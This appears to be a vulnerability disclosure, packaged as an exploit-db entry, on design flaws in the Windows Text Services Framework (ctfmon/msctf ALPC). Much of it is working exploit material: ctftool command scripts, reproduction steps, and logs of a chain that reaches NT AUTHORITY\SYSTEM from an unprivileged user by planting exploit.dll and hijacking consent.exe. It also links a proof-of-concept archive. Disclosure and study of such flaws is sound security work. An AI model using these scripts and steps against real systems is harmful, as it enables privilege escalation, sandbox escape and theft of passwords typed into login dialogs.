@@ -1,0 +1,356 @@
+The msctf subsystem is part of the Text Services Framework, The TSF manages things like input methods, keyboard layouts, text processing and so on. There are two main components, the ctfmon server and the msctf client.
+
+The ctfmon service creates an ALPC port in a well known location, to which clients connect and exchange messages. When any process creates a window, the kernel invokes a callback, USER32!CtfHookProcWorker, that automatically loads the CTF client.
+
+The CTF subsystem is vast and complex. It was most likely designed for LPC in Windows NT and bolted onto ALPC when it became available in Vista and later. The code is clearly dated with many legacy design decisions. In fact, the earliest version of MSCTF I've been able to find was from the 2001 release of Office XP, which even supported Windows 98. It was later included with Windows XP as part of the base operating system.
+
+There are multiple critical design flaws in this system, I've written a detailed technical analysis and an interactive utility to probe the CTF subsystem.
+
+$ ./ctftool.exe
+An interactive ctf exploration tool by @taviso.
+Type "help" for available commands.
+Most commands require a connection, see "help connect".
+ctf> help
+Type `help <command>` for help with a specific command.
+Any line beginning with # is considered a comment.
+
+help            - List available commands.
+exit            - Exit the shell.
+connect         - Connect to CTF ALPC Port.
+info            - Query server informaiton.
+scan            - Enumerate connected clients.
+callstub        - Ask a client to invoke a function.
+createstub      - Ask a client to instantiate CLSID.
+hijack          - Attempt to hijack an ALPC server path.
+sendinput       - Send keystrokes to thread.
+setarg          - Marshal a parameter.
+getarg          - Unmarshal a parameter.
+wait            - Wait for a process and set it as the default thread.
+thread          - Set the default thread.
+sleep           - Sleep for specified milliseconds.
+forget          - Forget all known stubs.
+stack           - Print the last leaked stack ptr.
+marshal         - Send command with marshalled parameters.
+proxy           - Send command with proxy parameters.
+call            - Send command without appended data.
+window          - Create and register a message window.
+patch           - Patch a marshalled parameter.
+module          - Print the base address of a module.
+module64        - Print the base address of a 64bit module.
+editarg         - Change the type of a marshalled parameter.
+symbol          - Lookup a symbol offset from ImageBase.
+set             - Change or dump various ctftool parameters.
+show            - Show the value of special variables you can use.
+lock            - Lock the workstation, switch to Winlogon desktop.
+repeat          - Repeat a command multiple times.
+run             - Run a command.
+script          - Source a script file.
+print           - Print a string.
+consent         - Invoke the UAC consent dialog.
+reg             - Lookup a DWORD in the registry.
+Most commands require a connection, see "help connect".
+ctf> connect
+The ctf server port is located at \BaseNamedObjects\msctf.serverDefault2
+NtAlpcConnectPort("\BaseNamedObjects\msctf.serverDefault2") => 0
+Connected to CTF server@\BaseNamedObjects\msctf.serverDefault2, Handle 00000248
+ctf> info
+The server responded.
+000000: 20 00 38 00 02 10 00 00 ec 04 00 00 a4 1a 00 00   .8.............
+000010: dc b6 00 00 35 1b 2e 00 38 00 00 00 20 2a 00 00  ....5...8... *..
+000020: 00 00 00 00 00 00 00 00 ec 04 00 00 00 00 00 00  ................
+000030: 00 00 00 00 00 00 00 00                          ........
+        Monitor PID: 1260
+ctf>
+
+Please see the attached document for a detailed analysis, but here are my major concerns with the service:
+
+1. The ctfmon ALPC port is accessible across sessions, allowing users to compromise other users of the system.
+2. UIPI can be bypassed, sending input events to higher integrity windows. This is an AppContainer or IL sandbox escape.
+3. The msctf client disables UIPI for Marshal event windows. As far as I can tell, this is unnecessary, only ctfmon should be sending these messages, which is already high integrity.
+4. The MSG_CALLSTUB command does not validate the command index, allowing arbitrary code execution.
+   4a. Frankly, even if you call a legitimate stub, you’re often trusted to Marshal pointers across the interface. 
+
+Many of the legitimate functions expect pointers with no validation (For example, CInputProcessorProfiles::Register, which is called via CStubITfInputProcessorProfileMgr::stub_ActivateProfile, FunctionIndex 3 for TfInputProcessorProfileMgr)
+
+5. There is no mutual authentication of Servers or Clients, therefore:
+   5a. You can hijack the alpc server path for other sessions and wait for clients to connect to you, then send them input.
+   5b. You can lie about your ThreadId, ProcessId and HWND, effectively redirecting messages from other clients.
+
+I'm planning to write a full SYSTEM exploit for these issues, because I think it's interesting and I've already invested a ton of work to get the tool working to make a PoC :)
+
+I assume you'll want a copy when it's finished.
+
+Interfering with processes across sessions
+------------------------------------------
+
+To reproduce, follow these steps:
+* Login as an Administrator to Session 1.
+* Please make sure that you do not have an open copy of notepad.
+* Use Fast User Switching (i.e. Ctrl-Alt-Del, Switch User) to create an unprivileged standard user session.
+* Create a file containing these commands:
+
+connect Default 1
+Sleep 10000
+wait notepad.exe
+createstub 0 4 IID_ITfInputProcessorProfileMgr
+setarg 6
+setarg 0x201 0x41414141
+setarg 0x20001 0x41414142
+setarg 0x1 ABABABAB-ABAB-ABAB-ABAB-ABABABABABAB
+setarg 0x1 BCBCBCBC-BCBC-BCBC-BCBC-BCBCBCBCBCBC
+setarg 0x10001 0x41414145
+setarg 0x201 0x41414146
+callstub 0 0 3
+quit
+
+Run the following command:
+
+PS Z:\Home> cat .\script.txt | .\ctftool.exe
+
+* Use fast user switching to return to Session 1.
+* Run windbg -c g ‘notepad.exe’
+* Wait 10 seconds, observe that notepad dereferences 0x41414141.
+
+This proves that an unprivileged user can interact with processes on a privileged session.
+
+UIPI can be bypassed, sending input events to higher integrity windows.
+-----------------------------------------------------------------------
+
+Use the following command to make ctftool.exe Low Integrity:
+
+> icacls ctftool.exe /setintegritylevel low
+
+Observe that the tool can still connect, scan, and interact with Windows.
+
+The msctf client disables UIPI for Marshal event windows.
+---------------------------------------------------------
+
+msctf!SYSTHREAD::LockThreadMessageWindow allows Marshal messages across integrity levels, I suspect this is a bug and unnecessary.
+
+The MSG_CALLSTUB command does not validate the command index.
+-------------------------------------------------------------
+
+This is the (decompiled) code that handles MSG_CALLSTUB (Command 0xA, I just guessed the name):
+
+    // Get pointer to appended Data
+    ProxyInfo = MsgBase::GetProxyInfoPtr(*MessagePtr);
+    if ( ProxyInfo )
+    {
+      ms_exc.registration.TryLevel = 0;
+      Systhread = this->Systhread;
+      if ( Systhread->StubArray )
+      {
+        FoundStub = 0;
+        FindStub(Systhread->StubArray, ProxyInfo->StubId, &FoundStub);
+        if ( FoundStub )
+        {
+          if ( FoundStub->TimeStamp == ProxyInfo->TimeStamp )
+            Result = FoundStub->vtbl->invoke(FoundStub, ProxyInfo->FunctionIndex, MessagePtr);
+        }
+      }
+      ms_exc.registration.TryLevel = -2;
+    }
+    return Result;
+
+Here, MessagePtr and ProxyInfo are entirely untrusted data, but that is then used to call an arbitrary index from a table, and the invoke method looks like this:
+
+int __thiscall CStubITfCompartment::Invoke(CStubITfCompartment *this, unsigned int FunctionIndex, struct MsgBase **Msg)
+{
+  return (*(&CStubITfCompartment::_StubTbl + FunctionIndex))(this, Msg);
+}
+
+(All the Invoke functions look similar)
+
+Reproduce like this:
+
+PS Z:\Home> .\ctftool.exe
+An interactive ctf exploration tool by @taviso.
+Type "help" for available commands.
+ctf> connect
+The ctf server port is located at \BaseNamedObjects\msctf.serverDefault1
+ctf> scan
+Client 0, Tid 3976 (Flags 0x08, Hwnd 00000F88, Pid 4012, explorer.exe)
+Client 1, Tid  780 (Flags 0x08, Hwnd 0000030C, Pid 4012, explorer.exe)
+Client 2, Tid  692 (Flags 0x08, Hwnd 000002B4, Pid 4012, explorer.exe)
+Client 3, Tid 4420 (Flags 0x0c, Hwnd 00001144, Pid 4352, SearchUI.exe)
+Client 4, Tid 7964 (Flags 0x08, Hwnd 00001F1C, Pid 7920, conhost.exe)
+Client 5, Tid 7116 (Flags 0x08, Hwnd 00001BCC, Pid 7112, procexp.exe)
+Client 6, Tid 9616 (Flags 0000, Hwnd 00002590, Pid 2096, ctfmon.exe)
+Client 7, Tid 9048 (Flags 0x08, Hwnd 00002358, Pid 11660, windbg.exe)
+Client 8, Tid 1020 (Flags 0x08, Hwnd 000003FC, Pid 4652, notepad.exe)
+Client 9, Tid 11620 (Flags 0000, Hwnd 00002D64, Pid 3776, ctftool.exe)
+ctf> createstub 1020 4 IID_ITfInputProcessorProfileMgr
+Command succeeded, stub created
+Dumping Marshal Parameter 3 (Base 00CAA4B0, Type 0x106, Size 0x18, Offset 0x40)
+000000: 4c e7 c6 71 28 0f d8 11 a8 2a 00 06 5b 84 43 5c  L..q(....*..[.C\
+000010: 01 00 00 00 33 01 61 12                          ....3.a.
+Marshalled Value 3, COM {71C6E74C-0F28-11D8-A82A-00065B84435C}, ID 1, Timestamp 0x12610133
+ctf> setarg 6
+New Parameter Chain, Length 6
+ctf> setarg 0x201 0x41414141
+Marshalled Value 0, INT 0000000041414141
+ctf> setarg 0x201 0x41414146
+Marshalled Value 1, INT 0000000041414146
+ctf> setarg 0x201 0x41414146
+Marshalled Value 2, INT 0000000041414146
+ctf> setarg 0x201 0x41414146
+Marshalled Value 3, INT 0000000041414146
+ctf> setarg 0x201 0x41414146
+Marshalled Value 4, INT 0000000041414146
+ctf> setarg 0x201 0x41414146
+Marshalled Value 5, INT 0000000041414146
+ctf> callstub 0 0 0xffff
+Sending the Proxy data failed, 0x80004005
+ctf> q
+
+
+There is no mutual authentication of clients and servers.
+----------------------------------------------------------
+
+To reproduce this issue, as an unprivileged session use the command `hijack` to create a new ALPC server, then create a privileged session.
+
+For example, `hijack Default 2`, to hijack the server for session 2 on the default desktop.
+
+When the new session is created, the tool will dump information as new privileged clients attempt to connect to the fake service.
+
+PS: Z:\Home> .\ctftool.exe
+An interactive ctf exploration tool by @taviso.
+Type "help" for available commands.
+ctf> hijack Default 1
+NtAlpcCreatePort("\BaseNamedObjects\msctf.serverDefault1") => 0 00000218
+NtAlpcSendWaitReceivePort("\BaseNamedObjects\msctf.serverDefault1") => 0 00000218
+000000: 18 00 30 00 0a 20 00 00 00 11 00 00 44 11 00 00  ..0.. ......D...
+000010: a4 86 00 00 b7 66 b8 00 00 11 00 00 44 11 00 00  .....f......D...
+000020: e7 12 01 00 0c 00 00 00 80 01 02 00 20 10 d6 05  ............ ...
+A a message received
+        ProcessID: 4352, SearchUI.exe
+        ThreadId: 4420
+        WindowID: 00020180
+NtAlpcSendWaitReceivePort("\BaseNamedObjects\msctf.serverDefault1") => 0 00000218
+000000: 18 00 30 00 0a 20 00 00 ac 0f 00 00 0c 03 00 00  ..0.. ..........
+000010: ec 79 00 00 fa 66 b8 00 ac 0f 00 00 0c 03 00 00  .y...f..........
+000020: 12 04 01 00 08 00 00 00 10 01 01 00 00 00 00 00  ................
+A a message received
+        ProcessID: 4012, explorer.exe
+        ThreadId: 780
+        WindowID: 00010110
+NtAlpcSendWaitReceivePort("\BaseNamedObjects\msctf.serverDefault1") => 0 00000218
+000000: 18 00 30 00 0a 20 00 00 ac 0f 00 00 0c 03 00 00  ..0.. ..........
+000010: fc 8a 00 00 2a 67 b8 00 ac 0f 00 00 0c 03 00 00  ....*g..........
+000020: 12 04 01 00 08 00 00 00 10 01 01 00 58 00 00 00  ............X...
+A a message received
+        ProcessID: 4012, explorer.exe
+        ThreadId: 780
+...
+
+Notes on the tool
+-----------------
+
+* I have only tested it on Windows 10.
+* The tool is interactive and uses readline, type help for a list of commands.
+* You can have the source if you like, please let me know.
+* The tool is unfinished, I plan to make a full working exploit but wanted to get the ball rolling on disclosure.
+
+
+The code has been tested with latest Win10 x64 as of 05/21, but I had to hardcode some offsets.
+
+In particular, I have msctf.dll 10.0.17763.348 and kernelbase.dll 10.0.17763.475 (I think those are the only two relevant modules).
+
+1. As an unprivileged user, execute `query user` to see all the others users on the system.
+
+2. Open ctfmonexploit.ctf in notepad, and set the connect line to the sessionid you want to compromise.  
+
+3.  Copy the exploit payload dll into c:\Windows\Temp, call it exploit.dll.
+
+4.  Run `icacls c:\Windows\Temp\exploit.dll /grant "Everyone:(RX)"`
+
+5.  Run `cat ctfmonexploit.ctf | .\ctftool.exe`
+ 
+6. The dll is loaded into a High Integrity process of the specified session when the session is next active.
+
+
+I got this attack working from unprivileged user to SYSTEM, even from LPAC.
+
+The trick is to switch to the WinLogon desktop, which an unprivileged user can do using USER32!LockWorkstation().
+
+PS Z:\Home\Documents\Projects\alpc> .\ctftool.exe
+An interactive ctf exploration tool by @taviso.
+Type "help" for available commands.
+Most commands require a connection, see "help connect".
+ctf> connect Winlogon 1
+The ctf server port is located at \BaseNamedObjects\msctf.serverWinlogon1
+NtAlpcConnectPort("\BaseNamedObjects\msctf.serverWinlogon1") => 0xc0000034
+Waiting for the specified port to appear...
+NtAlpcConnectPort("\BaseNamedObjects\msctf.serverWinlogon1") => 0
+Connected to CTF server@\BaseNamedObjects\msctf.serverWinlogon1, Handle 00000224
+ctf> scan
+Client 0, Tid 6324 (Flags 0000, Hwnd 000018B4, Pid 4020, ctftool.exe)
+Client 1, Tid 4656 (Flags 0x1000000c, Hwnd 00001230, Pid 2336, LogonUI.exe)
+Client 2, Tid 8692 (Flags 0x1000000c, Hwnd 000021F4, Pid 2336, LogonUI.exe)
+Client 3, Tid 4808 (Flags 0x10000008, Hwnd 000012C8, Pid 4440, TabTip.exe)
+Client 4, Tid 8800 (Flags 0x1000000c, Hwnd 00002260, Pid 8536, Utilman.exe)
+Client 5, Tid 6788 (Flags 0x10000008, Hwnd 00001A84, Pid 6628, osk.exe)
+
+
+I finished the exploit, it reliably gets NT AUTHORITY\SYSTEM from an unprivileged user on up-to-date Windows 10 1903.
+
+I sent Microsoft a finished version.
+
+Here is the current source code, and a video demonstrating it. I think the best targets are either logonui.exe or consent.exe, both run as SYSTEM.
+
+https://www.youtube.com/watch?v=JUbac3OLPaM
+
+$ ./ctftool.exe 
+An interactive ctf exploration tool by @taviso.
+Type "help" for available commands.
+Most commands require a connection, see "help connect".
+ctf> script .\scripts\ctf-consent-system.ctf
+Attempting to copy exploit payload...
+        1 file(s) copied.
+
+Right click something and select "Run as Administrator", then wait for a SYSTEM shell...
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+!!! YOU DONT NEED TO KNOW ANY PASSWORD, JUST WAIT! !!!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+The ctf server port is located at \BaseNamedObjects\msctf.serverDefault1
+Connected to CTF server@\BaseNamedObjects\msctf.serverDefault1, Handle 00000244
+Waiting for the consent dialog to join the session...
+Found new client consent.exe, DefaultThread now 6900
+consent.exe has joined the session, starting exploit...
+Command succeeded, stub created
+Dumping Marshal Parameter 3 (Base 011E89C0, Type 0x106, Size 0x18, Offset 0x40)
+000000: 4d e7 c6 71 28 0f d8 11 a8 2a 00 06 5b 84 43 5c  M..q(....*..[.C\
+000010: 01 00 00 00 6c 4a af 03                          ....lJ..
+Marshalled Value 3, COM {71C6E74D-0F28-11D8-A82A-00065B84435C}, ID 1, Timestamp 0x3af4a6c
+0x7ff8cf290000
+0x7ff8cf340000
+0x7ff8cffe0000
+0x7ff8cf340000
+Guessed kernel32 => C:\WINDOWS\system32\kernel32.DLL
+C:\WINDOWS\system32\kernel32.DLL is a 64bit module.
+kernel32!LoadLibraryA@0x180000000+0x1eb60
+The CFG call chain is built, writing in parameters...
+Writing in the payload path "C:\WINDOWS\TEMP\EXPLOIT.DLL"...
+0x7ff8cfc40000
+Payload created and call chain ready, get ready...
+C:\WINDOWS\system32>whoami
+nt authority\system
+
+
+If you have an input profile with enhanced capabilities available (in general, if you use an IME then you do - Chinese, Korean, Japanese, etc.), then a low privileged application on the same session can read and write data to a higher privileged application.
+
+The user doesn't need to have the language selected, because a CTF client can change active profile too, but it does have to be installed.
+
+The problem with this is that a low privileged application can take control of an elevated command prompt, escape a low-integrity sandbox, escape AppContainer/LPAC, read passwords out of login dialogs/consent dialogs, and so on.
+
+This means UIPI basically doesn't work any more.
+
+I've attached a ctf script that will wait for you to open notepad, and then write some text into it. Here is a screenshot of a low privileged ctftool typing into an Administrator console.
+
+Please note, if you *only* have languages installed that doesn't use an Out-of-process TIP (English, German, French, Polish, etc), you are likely unaffected (or at least, I don't know how to exploit it yet). Right now, it's mostly users in Asia affected by this, but I'm admittedly ignorant about i18n and a11y.
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47258.zip
